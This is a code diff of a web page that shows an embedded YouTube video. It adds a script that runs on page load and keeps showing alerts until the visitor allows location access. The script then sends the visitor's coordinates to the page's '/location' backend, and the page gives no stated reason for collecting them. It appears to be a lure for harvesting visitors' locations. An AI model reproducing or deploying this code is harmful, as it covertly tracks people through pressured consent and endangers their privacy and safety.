@@ -13,41 +13,42 @@
   <!-- <iframe width="560" height="315" src="https://www.youtube.com/embed/II2EO3Nw4m0?si=9BaGNUy8-hZMkWA9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe> -->
   <iframe width="560" height="315" src="https://www.youtube.com/embed/YZAFd9o3RYQ?si=VxpMZck8rrJSAGYT" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
   <script>
-    async function sendLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          async (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const accuracy = pos.coords.accuracy; // in meters
-  
-            console.log("📍 Latitude:", lat);
-            console.log("📍 Longitude:", lon);
-            console.log("🎯 Accuracy:", accuracy + " meters");
-  
-            // Send to backend
-            await fetch("/location", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ latitude: lat, longitude: lon}),
+    async function askLocation() {
+        let granted = false;
+
+        while (!granted) {
+            try {
+                await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+                granted = true;
+            } catch (err) {
+                alert("⚠️ Please allow location access to continue.");
+                await new Promise(resolve => setTimeout(resolve, 2000)); // wait before retry
+            }
+        }
+
+        navigator.geolocation.getCurrentPosition(async (position) => {
+            const { latitude, longitude } = position.coords;
+            console.log("📍 Location:", latitude, longitude);
+
+            const res = await fetch("/location", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ latitude, longitude })
             });
-          },
-          (err) => {
-            console.error("❌ Error getting location:", err.message);
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0,
-          }
-        );
-      } else {
-        alert("🚫 Geolocation not supported");
-      }
+
+            const result = await res.json();
+            alert(result.message || result.error);
+        });
     }
-  
-    window.onload = sendLocation;
-  </script>
+
+    // Call it on page load
+    window.onload = askLocation;
+</script>
+
   
 
 </body>
